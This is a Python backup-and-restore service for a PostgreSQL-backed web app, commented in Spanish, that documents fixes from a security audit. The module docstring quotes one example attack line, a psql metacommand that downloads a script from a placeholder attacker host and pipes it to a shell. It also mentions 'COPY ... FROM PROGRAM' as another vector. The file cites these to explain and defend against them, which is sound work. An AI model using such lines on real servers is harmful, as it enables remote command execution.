# SIN USO (29/08/2026, pedido del cliente): igual que app/router/backup.py
# (ver el comentario ahí), este servicio quedó huérfano al dar de baja el
# backup manual desde la app. Se puede borrar a mano
# (app/services/backup_service.py) si querés.
"""Generar y restaurar un backup completo de la base de datos con pg_dump/
pg_restore (solo administradores -- ver app/router/backup.py).

No se arma el backup leyendo las tablas con SQLAlchemy a propósito: un dump
generado con las herramientas oficiales de Postgres es fiel al esquema real
completo (constraints, índices, tipos ENUM, secuencias, todo) y se restaura
después sin necesidad de ningún script propio que reconstruya cada tabla a
mano -- justo lo que se busca en un backup de verdad. El costo es que esto
depende de tener pg_dump/pg_restore instalados y accesibles (ver
PG_DUMP_PATH / PG_RESTORE_PATH en app/core/config.py).

FIX V-01 (auditoría AppSec, 28/08/2026 -- "ejecución de comandos en el
servidor a través de la restauración de backup"): este archivo tenía dos
problemas serios, ya corregidos acá:

1. El backup era texto SQL plano, restaurado con "psql -f archivo.sql".
   psql interpreta metacomandos de barra invertida (\\!, \\i, \\copy) en
   CUALQUIER archivo que reciba con -f -- ni "--single-transaction" ni
   "--set ON_ERROR_STOP=1" los desactivan (controlan la transacción y los
   errores SQL, no el intérprete de metacomandos). Un admin engañado para
   subir un ".sql" con una línea "\\! curl http://atacante/x.sh | sh"
   ejecutaba ese comando con los privilegios del proceso de la API. Ahora
   el backup es en formato "custom" (binario) de pg_dump, aplicado con
   pg_restore -- sin intérprete de metacomandos.
2. Eso solo no alcanza: un archivo en formato custom armado a mano (no
   generado por pg_dump) todavía podría traer, por ejemplo, una función
   definida en un lenguaje procedural sin sandbox o un "COPY ... FROM
   PROGRAM". Por eso todo backup que genera esta app se firma con HMAC (ver
   _firmar_backup) usando una clave derivada de SECRET_KEY, y
   restaurar_backup_completo RECHAZA cualquier archivo cuya firma no
   coincida, antes de que pg_restore llegue siquiera a mirarlo. Sin conocer
   SECRET_KEY no hay forma de producir una firma válida -- esta es, en la
   práctica, la protección que más importa (más que el cambio de formato).

FIX V-03b (mismo informe): la URI de conexión completa -- con la contraseña
adentro -- ya no se pasa como argumento de línea de comandos (quedaba
visible en la tabla de procesos, "ps aux", para cualquier usuario local del
servidor). Host/puerto/base/usuario se pasan como flags (no son secretos);
la contraseña viaja SOLO por la variable de entorno PGPASSWORD. Y el
stderr crudo de pg_dump/pg_restore -- que puede filtrar host/base/usuario
-- ya no se devuelve al cliente: queda solo en el log del servidor.
"""

import hashlib
import hmac
import logging
import os
import re
import shutil
import subprocess
import tempfile
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import unquote, urlsplit

from app.core.config import (
    APP_NAME,
    BACKUP_RESTORE_TIMEOUT_SEGUNDOS,
    BACKUP_TIMEOUT_SEGUNDOS,
    DATABASE_URL,
    PG_DUMP_PATH,
    PG_RESTORE_PATH,
    SECRET_KEY,
    STORAGE_CATEGORIAS_DIR,
    STORAGE_PRODUCTOS_DIR,
)

logger = logging.getLogger(__name__)

# DATABASE_URL viaja con el driver de SQLAlchemy en el esquema (ej.
# "postgresql+psycopg2://...") -- pg_dump/pg_restore son herramientas de
# línea de comandos que no entienden ese "+driver", solo "postgresql://" a
# secas.
_SUFIJO_DRIVER_RE = re.compile(r"^postgresql\+[^:]+://")

# Nombres fijos DENTRO del .zip -- restaurar_backup_completo() los busca por
# estos mismos nombres, así que si se cambian acá hay que cambiarlos ahí
# también.
_NOMBRE_DUMP_EN_ZIP = "backup.dump"
_NOMBRE_FIRMA_EN_ZIP = "firma.sha256"
_CARPETA_PRODUCTOS_EN_ZIP = "storage/productos"
_CARPETA_CATEGORIAS_EN_ZIP = "storage/categorias"

# Contexto de dominio para la firma de backups -- separado de cualquier otro
# uso de SECRET_KEY (JWT, etc.) a propósito: así una clave derivada acá
# nunca puede reutilizarse para falsificar ni validar nada de otro sistema.
_CONTEXTO_FIRMA_BACKUP = b"lt-informatica-backup-hmac-v1"


class BackupError(Exception):
    """pg_dump/pg_restore no está disponible, terminó con un error, o el
    archivo a restaurar no pasó alguna validación.

    El mensaje de esta excepción es el que se le muestra al admin (ver
    router/backup.py) -- pensado para ser accionable y para NO filtrar
    detalles internos (host, usuario, stderr crudo -- ver V-03b). El
    detalle completo para diagnóstico va siempre al log, nunca al cliente.
    """


def _clave_firma_backup() -> bytes:
    """Clave de firma derivada de SECRET_KEY (HMAC-SHA256 con un contexto
    fijo, ver _CONTEXTO_FIRMA_BACKUP) -- no hace falta un secreto nuevo en
    el .env: SECRET_KEY ya es un valor largo y aleatorio, y derivar con un
    contexto distinto por uso es una práctica estándar (domain separation)
    para no reutilizar la misma clave cruda en dos lugares distintos.
    """
    return hashlib.sha256(SECRET_KEY.encode("utf-8") + _CONTEXTO_FIRMA_BACKUP).digest()


def _firmar_backup(contenido_dump: bytes) -> str:
    """HMAC-SHA256 (hex) del dump binario -- ver el punto 2 del docstring
    del módulo. Firmar el dump, no todo el .zip, es intencional: las
    imágenes que van en el mismo .zip no habilitan ejecución de comandos
    (el peor caso es subir imágenes arbitrarias, algo que un admin ya puede
    hacer por la vía normal), así que no hace falta firmarlas también."""
    return hmac.new(_clave_firma_backup(), contenido_dump, hashlib.sha256).hexdigest()


def _datos_conexion_pg() -> tuple[list[str], dict[str, str]]:
    """Parsear DATABASE_URL y devolver (flags de conexión, variables de
    entorno) para pasarle a pg_dump/pg_restore -- ver FIX V-03b en el
    docstring del módulo: la contraseña va SOLO por PGPASSWORD, nunca en la
    lista de argumentos.
    """
    if not DATABASE_URL:
        raise BackupError("DATABASE_URL no está configurada.")

    uri_sin_driver = _SUFIJO_DRIVER_RE.sub("postgresql://", DATABASE_URL)
    partes = urlsplit(uri_sin_driver)
    base = partes.path.lstrip("/")
    if not partes.hostname or not partes.username or not base:
        raise BackupError(
            "DATABASE_URL no tiene el formato esperado "
            "(postgresql://usuario:password@host:puerto/base)."
        )

    flags = [
        "-h", partes.hostname,
        "-p", str(partes.port or 5432),
        "-U", unquote(partes.username),
        "-d", base,
    ]

    entorno = dict(os.environ)
    if partes.password:
        entorno["PGPASSWORD"] = unquote(partes.password)
    # lock_timeout vía PGOPTIONS (variable estándar de libpq): se aplica a
    # TODA conexión que abran pg_dump/pg_restore, sin necesidad de un SET
    # manual. 15000 = 15000 ms = 15 segundos. Ver el porqué en
    # _restaurar_dump_binario más abajo -- ahí es donde de verdad importa
    # (pg_dump normalmente no necesita locks exclusivos).
    entorno["PGOPTIONS"] = "-c lock_timeout=15000"
    return flags, entorno


def _generar_dump_binario() -> Path:
    """Correr pg_dump en formato "custom" (binario) contra la base
    configurada y devolver la ruta del archivo temporal generado.

    El archivo se escribe en el directorio temporal del sistema operativo,
    nunca dentro del proyecto -- no queda ninguna copia permanente en el
    servidor. Quien llama es responsable de borrarlo.
    """
    descriptor, ruta_str = tempfile.mkstemp(suffix=".dump", prefix="backup_")
    os.close(descriptor)
    ruta = Path(ruta_str)

    flags, entorno = _datos_conexion_pg()
    comando = [PG_DUMP_PATH, "--format=custom", "--no-owner", "--no-privileges", "-f", ruta_str, *flags]
    try:
        resultado = subprocess.run(
            comando, capture_output=True, text=True, env=entorno, timeout=BACKUP_TIMEOUT_SEGUNDOS
        )
    except FileNotFoundError:
        ruta.unlink(missing_ok=True)
        raise BackupError(
            f"No se encontró pg_dump ('{PG_DUMP_PATH}'). Verificá que Postgres esté instalado y que "
            "pg_dump esté en el PATH, o configurá PG_DUMP_PATH en el .env con la ruta completa al "
            'ejecutable (ej. "C:\\Program Files\\PostgreSQL\\16\\bin\\pg_dump.exe").'
        ) from None
    except subprocess.TimeoutExpired:
        ruta.unlink(missing_ok=True)
        raise BackupError(
            f"pg_dump no terminó dentro de los {BACKUP_TIMEOUT_SEGUNDOS} segundos de espera. Si la "
            "base creció mucho, se puede subir BACKUP_TIMEOUT_SEGUNDOS en el .env."
        ) from None

    if resultado.returncode != 0:
        # FIX V-03b: el stderr puede filtrar host/base/usuario -- se loguea
        # completo para diagnóstico, pero al cliente se le devuelve un
        # mensaje genérico.
        logger.error("pg_dump terminó con error (código %s): %s", resultado.returncode, resultado.stderr)
        ruta.unlink(missing_ok=True)
        raise BackupError("pg_dump terminó con un error -- ver el log del servidor para el detalle.")

    return ruta


def generar_backup_completo() -> tuple[Path, str]:
    """Arma un .zip con el dump de la base (formato custom, firmado con
    HMAC -- ver _firmar_backup) MÁS una copia de todas las imágenes
    actuales de productos y categorías, que viven aparte de la base (ver
    STORAGE_PRODUCTOS_DIR/STORAGE_CATEGORIAS_DIR en app/core/config.py).
    Sin esto, restaurar un backup en un servidor nuevo dejaría los
    productos con imagen_url apuntando a un archivo que no existe en
    ningún lado.

    Igual que _generar_dump_binario, el .zip se arma en el directorio
    temporal del sistema operativo y quien llama es responsable de
    borrarlo después (ver BackgroundTask en router/backup.py).
    """
    ruta_dump = _generar_dump_binario()
    try:
        contenido_dump = ruta_dump.read_bytes()
        firma = _firmar_backup(contenido_dump)

        descriptor, ruta_zip_str = tempfile.mkstemp(suffix=".zip", prefix="backup_completo_")
        os.close(descriptor)
        ruta_zip = Path(ruta_zip_str)
        try:
            with zipfile.ZipFile(ruta_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zip_archivo:
                zip_archivo.writestr(_NOMBRE_DUMP_EN_ZIP, contenido_dump)
                zip_archivo.writestr(_NOMBRE_FIRMA_EN_ZIP, firma)
                for carpeta_origen, carpeta_en_zip in (
                    (STORAGE_PRODUCTOS_DIR, _CARPETA_PRODUCTOS_EN_ZIP),
                    (STORAGE_CATEGORIAS_DIR, _CARPETA_CATEGORIAS_EN_ZIP),
                ):
                    if not carpeta_origen.is_dir():
                        continue
                    for archivo_imagen in carpeta_origen.iterdir():
                        if archivo_imagen.is_file():
                            zip_archivo.write(archivo_imagen, arcname=f"{carpeta_en_zip}/{archivo_imagen.name}")
        except OSError as error:
            ruta_zip.unlink(missing_ok=True)
            raise BackupError(f"No se pudo armar el archivo del backup completo: {error}") from None
    finally:
        ruta_dump.unlink(missing_ok=True)

    marca_tiempo = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    nombre_app = re.sub(r"[^A-Za-z0-9_-]+", "_", APP_NAME).strip("_") or "backup"
    nombre_descarga = f"{nombre_app}_backup_completo_{marca_tiempo}.zip"
    return ruta_zip, nombre_descarga


def _restaurar_dump_binario(contenido: bytes) -> None:
    """Aplica un dump en formato custom (el que arma _generar_dump_binario)
    contra la base configurada, REEMPLAZANDO todo lo que tenga en las
    tablas que aparezcan en el archivo. Operación destructiva e
    irreversible -- quien llama (restaurar_backup_completo) es responsable
    de haber verificado la firma HMAC antes de invocar esto.

    --single-transaction (implica --exit-on-error en pg_restore): toda la
    restauración corre como UNA sola transacción -- si cualquier sentencia
    falla, Postgres revierte TODO, la base queda exactamente como estaba
    antes de intentarlo.

    --clean --if-exists: pg_restore borra cada objeto (tabla, secuencia,
    etc.) antes de recrearlo, en el orden correcto de dependencias --
    mismo efecto que el "DROP SCHEMA public CASCADE" que se hacía antes a
    mano, pero con el mecanismo propio de Postgres en vez de una sentencia
    SQL armada por esta app.
    """
    descriptor, ruta_str = tempfile.mkstemp(suffix=".dump", prefix="restore_")
    ruta = Path(ruta_str)
    try:
        with os.fdopen(descriptor, "wb") as handle:
            handle.write(contenido)

        flags, entorno = _datos_conexion_pg()
        comando = [
            PG_RESTORE_PATH,
            "--clean",
            "--if-exists",
            "--single-transaction",
            *flags,
            ruta_str,
        ]
        try:
            resultado = subprocess.run(
                comando, capture_output=True, text=True, env=entorno, timeout=BACKUP_RESTORE_TIMEOUT_SEGUNDOS
            )
        except FileNotFoundError:
            raise BackupError(
                f"No se encontró pg_restore ('{PG_RESTORE_PATH}'). Verificá que Postgres esté instalado y "
                "que pg_restore esté en el PATH, o configurá PG_RESTORE_PATH en el .env con la ruta "
                'completa al ejecutable (ej. "C:\\Program Files\\PostgreSQL\\16\\bin\\pg_restore.exe").'
            ) from None
        except subprocess.TimeoutExpired:
            raise BackupError(
                f"pg_restore no terminó dentro de los {BACKUP_RESTORE_TIMEOUT_SEGUNDOS} segundos de "
                "espera. La restauración se revirtió sola, la base no quedó a medio actualizar. Si la "
                "base creció mucho, se puede subir BACKUP_RESTORE_TIMEOUT_SEGUNDOS en el .env."
            ) from None

        if resultado.returncode != 0:
            logger.error("pg_restore terminó con error (código %s): %s", resultado.returncode, resultado.stderr)
            # "lock timeout" es el error puntual que tira PGOPTIONS
            # (lock_timeout=15000, ver _datos_conexion_pg) cuando no
            # consigue el lock -- caso más probable: el job de
            # reconciliación de pagos (corre cada 1 minuto) tenía una
            # transacción abierta en ese momento. Mensaje específico para
            # que el admin sepa que no es un error real de los datos y que
            # alcanza con reintentar.
            if "lock timeout" in resultado.stderr.lower():
                raise BackupError(
                    "No se pudo restaurar porque la base estaba ocupada (probablemente el "
                    "procesamiento automático de pedidos, que corre cada 1 minuto) y no se liberó "
                    "a tiempo. No se tocó nada -- probá de nuevo en unos segundos."
                )
            # FIX V-03b: no se devuelve el stderr crudo al cliente -- queda
            # solo en el log de arriba.
            raise BackupError(
                "La restauración falló y se revirtió por completo (la base no se tocó) -- ver el log "
                "del servidor para el detalle."
            )
    finally:
        ruta.unlink(missing_ok=True)


def _reemplazar_carpeta_con_zip(zip_archivo: zipfile.ZipFile, carpeta_en_zip: str, carpeta_destino: Path) -> None:
    """Deja carpeta_destino con EXACTAMENTE los archivos que trae el .zip
    bajo carpeta_en_zip -- borra lo que había antes, no lo mezcla. Mismo
    criterio "reemplazar, no fusionar" que ya usa la base de datos:
    "restaurar" significa que la carpeta queda igual que en el backup, no
    una mezcla con lo que hubiera quedado. Si el .zip no traía ningún
    archivo para esta carpeta (ej. backup viejo sin imágenes todavía), la
    carpeta queda vacía -- es el comportamiento correcto: en el momento
    del backup no había ninguna imagen.
    """
    carpeta_destino.mkdir(parents=True, exist_ok=True)
    for archivo_existente in carpeta_destino.iterdir():
        if archivo_existente.is_file():
            archivo_existente.unlink()

    prefijo = f"{carpeta_en_zip}/"
    for info in zip_archivo.infolist():
        if info.is_dir() or not info.filename.startswith(prefijo):
            continue
        # Path(...).name descarta cualquier componente de carpeta del
        # nombre que traiga el .zip (incluido "..") -- así un .zip armado
        # a mano y con nombres raros nunca puede escribir fuera de
        # carpeta_destino.
        nombre_archivo = Path(info.filename[len(prefijo):]).name
        if not nombre_archivo:
            continue
        with zip_archivo.open(info) as origen, open(carpeta_destino / nombre_archivo, "wb") as destino:
            shutil.copyfileobj(origen, destino)


def restaurar_backup_completo(contenido_zip: bytes) -> None:
    """Restaura un backup completo (.zip generado por
    generar_backup_completo): primero verifica la firma HMAC del dump (ver
    el punto 2 del docstring del módulo -- ESTA es la comprobación que más
    importa), después restaura la base de datos, y recién si eso salió
    bien, reemplaza el contenido de storage/productos y storage/categorias
    por lo que traía el .zip.

    El orden importa: si la firma no es válida, o si el .zip viene
    corrupto, incompleto o con datos incompatibles, se corta ANTES de
    tocar nada -- nunca se llega a aplicar un dump no confiable ni a tocar
    una imagen por un backup que de entrada iba a fallar. A diferencia de
    la base, el reemplazo de archivos en disco NO es transaccional (no hay
    forma de "revertir" un archivo ya sobrescrito), por eso se hace último.
    """
    descriptor, ruta_zip_str = tempfile.mkstemp(suffix=".zip", prefix="restore_completo_")
    ruta_zip = Path(ruta_zip_str)
    try:
        with os.fdopen(descriptor, "wb") as handle:
            handle.write(contenido_zip)

        try:
            zip_archivo = zipfile.ZipFile(ruta_zip)
        except zipfile.BadZipFile:
            raise BackupError(
                "El archivo no es un backup completo válido (.zip corrupto o de otro formato)."
            ) from None

        with zip_archivo:
            try:
                contenido_dump = zip_archivo.read(_NOMBRE_DUMP_EN_ZIP)
            except KeyError:
                raise BackupError(
                    f'El .zip no contiene "{_NOMBRE_DUMP_EN_ZIP}" -- no parece un backup completo '
                    "generado por esta app."
                ) from None

            try:
                firma_recibida = zip_archivo.read(_NOMBRE_FIRMA_EN_ZIP).decode("utf-8").strip()
            except (KeyError, UnicodeDecodeError):
                firma_recibida = ""

            # FIX V-01 (la capa que más importa -- ver el docstring del
            # módulo): un archivo que no esté firmado con la clave
            # derivada del SECRET_KEY de ESTA instalación se rechaza acá,
            # antes de que pg_restore llegue siquiera a mirarlo. Sin
            # conocer SECRET_KEY no hay forma de producir una firma
            # válida, así que esto cierra el vector aunque alguien arme a
            # mano un archivo en formato custom válido.
            firma_esperada = _firmar_backup(contenido_dump)
            if not firma_recibida or not hmac.compare_digest(firma_recibida, firma_esperada):
                raise BackupError(
                    "Este archivo no fue generado por esta aplicación (firma inválida) -- no se puede "
                    "restaurar. Si es un backup legítimo descargado de acá, probá volver a descargarlo "
                    "de nuevo; si no lo es, no lo subas."
                )

            # Si esto tira BackupError, la ejecución corta acá y ninguna
            # imagen se toca (ver docstring de esta función).
            _restaurar_dump_binario(contenido_dump)

            for carpeta_en_zip, carpeta_destino in (
                (_CARPETA_PRODUCTOS_EN_ZIP, STORAGE_PRODUCTOS_DIR),
                (_CARPETA_CATEGORIAS_EN_ZIP, STORAGE_CATEGORIAS_DIR),
            ):
                _reemplazar_carpeta_con_zip(zip_archivo, carpeta_en_zip, carpeta_destino)
    finally:
        ruta_zip.unlink(missing_ok=True)
